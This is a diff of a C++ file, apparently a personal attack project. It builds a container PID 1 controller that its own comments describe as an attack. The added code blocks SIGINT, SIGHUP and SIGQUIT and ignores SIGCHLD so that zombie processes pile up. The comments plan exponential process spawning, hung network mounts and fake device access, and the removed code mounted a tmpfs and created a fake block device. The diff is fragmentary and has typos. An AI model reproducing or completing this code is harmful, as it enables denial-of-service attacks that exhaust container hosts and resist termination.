@@ -1,3 +1,15 @@
+// signal blockers inside PID1 controller
+// with notes for myself
+
+
+//Implementations of 
+// Initialize the Attack:
+
+// Create a process that becomes PID 1 inside the container
+
+// Disable or ignore SIGTERM signal handling in PID 1
+
+// Set up a mechanism to spawn child processes exponentially
 
 #include <iostream>
 #include <sys/types.h>
@@ -9,43 +21,28 @@
 #include <chrono>
 #include <fcntl.h>
 #include <sys/stat.h>
+#include <cstring>
+#include <fstream>
 #include <sys/mount.h>
 #include <errno.h>
-#include <string.h>
-#include <dirent.h>
-#include <sys/sysmacros.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <linux/fs.h>
+#include <sys/ioctl.h>
 using namespace std;
 
-class DihStateCreator{ //Dead State Creator
-    private:
-    static bool mount_created;
-    static const char* mount_path;
-
-    public:
-    DihStateCreator(){}
-
-    bool broke_mount(){
-        mkdir("/tmp/broken_file_dir",0700);
-
-        if(mount("none","/tmp/broken_file_dir", "tmpfs", 0, "size=1M") == -1){
-            cout<<strerror(errno);
-        }
-
-        mknod("/tmp/broken_fire_dir/dih_device_fake", S_IFBLK | 0600, makedev(999, 999));
-    }
-
-
-
-};
-
-
-
-
+// STEP 0
 class PID1ctrller{
     private:
     int max;
     int cur_process;
     bool pls_pls_pls_stop;
+
+    void createDihState();
+    bool mound_hung_netowrk();
+    bool create_hung_network();
+    bool access_fake_dihvice();
 
     public:
     PID1ctrller(int max):
@@ -69,7 +66,11 @@ class PID1ctrller{
         }
 
         sigaddset(&sig_set, SIGINT); //to block ctrl+C
+        sigaddset(&sig_set, SIGHUP);
+        sigaddset(&sig_set, SIGQUIT);
+
         sigprocmask(SIG_BLOCK, &sig_set, nullptr);
+        signal(SIGCHLD, SIG_IGN); // ignore ts so that it cant reap Z processes
     }
 
 
@@ -186,3 +187,4 @@ int main(int argc, char* argv[]){
     return 0;
 
 
+}
